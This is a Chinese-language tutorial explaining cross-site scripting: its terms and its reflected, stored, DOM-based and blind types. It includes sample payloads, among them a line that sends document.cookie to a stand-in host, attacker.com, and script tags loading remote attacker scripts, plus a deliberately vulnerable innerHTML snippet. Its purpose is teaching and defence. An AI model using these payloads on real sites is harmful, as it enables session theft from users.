# XSS介绍

## 1. XSS基础

### 一、什么是XSS（跨站脚本）

**XSS**（Cross-Site Scripting，跨站脚本）是一种注入攻击：攻击者将恶意 JavaScript 代码"注入"到网页中，当其他用户（受害者）浏览该页面时，注入的脚本在受害者的浏览器中执行。

由于脚本在**网站的来源（Origin）下**运行，它可以读取和修改页面内容、窃取 Cookie 与会话令牌、代表用户执行操作（如改密码、转账），甚至加载其他恶意内容。

### 二、有关术语

1. **文档对象模型（DOM）：** 浏览器把 HTML 文档解析成的树形结构对象。JavaScript 可以通过 DOM 读写页面内容与结构，XSS 载荷常通过操作 DOM 来完成攻击。
2. **URL 参数：** 网址中 `?` 后面的键值对（如 `?q=xxx`）。这是反射型 XSS 和 DOM 型 XSS 最常见的注入点。
3. **JavaScript：** 浏览器端脚本语言。XSS 注入的目标就是 JS 代码，一旦执行即可读取页面、Cookie 等敏感数据。
4. **Cookies：** 浏览器存储在客户端的小型数据块，常用于维持登录会话（Session）。它是 XSS 的主要窃取目标（受 `HttpOnly` 保护的 Cookie 无法被 JavaScript 读取）。
5. **转义（Escape / 输出编码）：** 将特殊字符（如 `<`、`>`、`"`、`'`）转换为无害形式的过程，是防止 XSS 的核心手段。

## 2. XSS有效载荷

### 一、什么是XSS载荷

在 XSS 的语境中，**载荷（Payload）** 是攻击者注入到运行于其他用户浏览器中的网页应用中的 JavaScript 代码。

当一个易受攻击的网站接受用户输入并在**未正确过滤**的情况下显示时，浏览器可能会将注入的代码解读为网页的一部分。一旦发生这种情况，JavaScript 就会像页面上的合法代码一样在受害者的浏览器中执行。

最简单的验证载荷（弹窗确认漏洞存在）：

```html
<script>alert('XSS')</script>
```

### 二、载荷注入的位置

XSS 载荷通常注入到网站中**接受并显示用户输入**的区域：

- 搜索字段（Search Field）
- 评论区（Comment Section）
- 配置文件名称（Profile Name）
- 反馈表单（Feedback Form）
- URL 参数（URL Parameter）

## 3. 反射型XSS（Reflected XSS）

**反射型 XSS** 是指网页应用接收用户输入（如查询字符串、表单字段或 HTTP 头部）并**立即在页面上显示**，且未进行净化处理。

攻击者会伪造包含 JavaScript 的恶意链接或表单，并诱使受害者点击；由于网站"反映"（反射）了攻击者的输入，浏览器会在网站的来源处运行注入的脚本。典型的触发器包括**搜索框、错误信息**，或任何与 URL 或正文参数相呼应的页面。

**利用示例：**

```html
http://victim.com/search?q=<script>alert('XSS')</script>
```

**攻击过程：**

1. 攻击者构造包含恶意载荷的链接。
2. 诱使受害者点击该链接（钓鱼邮件、社交平台传播）。
3. 服务器把 `q` 参数的值原样拼进页面并返回。
4. 浏览器把 `<script>` 当作页面代码执行。

**危害：** 当注入的脚本在受害者的浏览器中运行时，它可以读取或修改页面，窃取 Cookie 或会话令牌（除非这些 Cookie 设置了 `HttpOnly` 标志），代表用户执行操作，或加载其他恶意内容。

**根本原因：** 将不可信的数据**输出为代码**，而不是在适当的上下文中进行转义。

**特点：** 载荷**不会持久保存**，只在受害者访问该恶意链接的这一次请求中生效，无法影响其他用户。

## 4. 存储型XSS（Stored XSS）

**存储型 XSS** 是指应用程序将攻击者控制的输入**保存在服务器上**（通常是数据库），随后将该内容提供给其他用户且未正确转义，导致注入的脚本在**每个访客的浏览器中**运行。

**存储型 XSS 比反射型 XSS 影响更大**，因为载荷会持续存在，并且随着时间推移会影响许多用户（管理员、网站访客）。

**利用示例（评论区植入载荷）：**

```html
<script src="http://attacker.com/evil.js"></script>
```

只要任何用户（包括管理员）打开评论区，该脚本就会在页面源码上下文中执行。

**常见位置：** 评论区、用户资料简介、留言板、产品评测、消息系统，以及渲染元数据的文件上传功能、仅管理员可见的面板。

**攻击过程：**

1. 攻击者在评论区 / 个人资料等位置提交包含载荷的内容。
2. 服务器把载荷存储进数据库。
3. 其他用户（或管理员）浏览该页面时，服务器把存储内容原样返回。
4. 浏览器执行注入的 JavaScript。

**危害：** 该脚本可以窃取会话令牌并代表用户执行操作。由于管理员也会中招，攻击者可能借此获取管理员权限（如窃取管理员 Cookie 实现提权）。

## 5. 基于DOM型XSS（DOM-based XSS）

**DOM 型 XSS** 与前两种不同：**攻击载荷不经过服务器处理**，漏洞完全存在于**客户端 JavaScript 代码本身**。服务器返回的 HTML 是正常的，只是在页面加载后，页面内的 JS 代码读取了 URL 中的参数并**直接写入 DOM**，从而触发了脚本执行。

**原理：** 页面中的 JavaScript 把不可信的输入（如 `location.search`、`location.hash`、`document.URL`、`document.referrer`）作为参数，动态写入 DOM 的**危险位置（Sink）**，例如：

- `document.write()`
- `element.innerHTML`
- `element.outerHTML`
- `eval()` / `setTimeout()`（将字符串当代码执行）
- `location` 跳转

**利用示例：**

```html
http://victim.com/?name=<img src=x onerror=alert(document.cookie)>
```

页面中对应的脆弱 JS 代码：

```javascript
var name = new URLSearchParams(window.location.search).get('name');
document.getElementById('welcome').innerHTML = 'Hello, ' + name;
```

当 `name` 参数为 `<img src=x onerror=...>` 时，`innerHTML` 把该字符串当作 HTML 插入，`onerror` 事件触发脚本执行。

**攻击过程：**

1. 受害者点击攻击者构造的恶意链接。
2. 服务器正常返回页面（HTML 中不包含载荷）。
3. 页面 JS 读取 URL 参数并写入 DOM。
4. 浏览器解析动态插入的内容，执行恶意脚本。

**特点：**

- 载荷**不经过服务器**，服务器日志和传统 WAF 难以发现。
- 服务器端防护（如输出转义）对 DOM 型 XSS 无效，需要从**客户端 JS 代码**层面修复。
- 与反射型的区别：反射型由服务端"拼回"页面，DOM 型由客户端 JS"自己写"页面。

## 6. 盲选型XSS（Blind XSS）

**盲选型 XSS（盲打 XSS）** 是一种特殊场景：攻击者注入的载荷**不在当前页面回显**，而是被存储后，触发在**攻击者看不到的地方**——通常是后台管理系统、客服工单面板、日志查看页面等。

因为攻击者无法直接看到执行结果，只能"盲打"，所以称为 **Blind（盲）XSS**。

**典型场景：**

- 反馈表单 / 联系表单（内容被管理员在后台查看）
- 客服工单系统（用户提交的内容被客服打开）
- 错误日志、访问日志（如 User-Agent、Referer 头被记录并在后台展示）
- 仅管理员可访问的审核面板

**利用方式：**

1. 在会"存档但不回显"的输入点（如反馈表单、UA 头）注入载荷。
2. 载荷不会在攻击者页面显示，但会被后台系统存储。
3. 当管理员打开后台查看时，载荷在管理员浏览器中执行。
4. 由于攻击者看不到执行现场，需配合**带外（OOB）交互**验证——让载荷执行时向攻击者服务器发送请求，以此确认成功并回传数据。

**带外验证载荷示例：**

```html
<script>fetch('http://attacker.com/steal?c='+document.cookie)</script>
```

或加载远程脚本：

```html
<script src="http://attacker.com/x.js"></script>
```

**常用工具：** Burp Collaborator（监听 DNS/HTTP 回连）、XSS Hunter 等，用于接收盲打载荷的带外请求。

**特点：**

- 危害高：目标通常是**管理员**等高权限账户，可借此直接提权。
- 检测难：需要带外交互确认，常规抓包看不到结果。
- 属于**存储型 XSS 的一种特殊利用形态**（载荷入库，后在其他页面触发）。

## 7. XSS类型对比

| 类型 | 载荷存放位置 | 触发时机 | 影响范围 | 是否过服务器 |
| --- | --- | --- | --- | --- |
| 反射型 | 不在服务器，随恶意链接携带 | 受害者点击链接的这一次请求 | 仅受害者本人 | 是 |
| 存储型 | 服务器数据库 | 任何用户（含管理员）访问页面时 | 所有访客，持久 | 是 |
| 基于DOM | URL 参数，不进服务器 | 页面 JS 读取参数写入 DOM 时 | 受害者本人 | 否 |
| 盲选型 | 服务器（后台存档） | 管理员/客服在后台查看时 | 高权限账户，持久 | 是 |
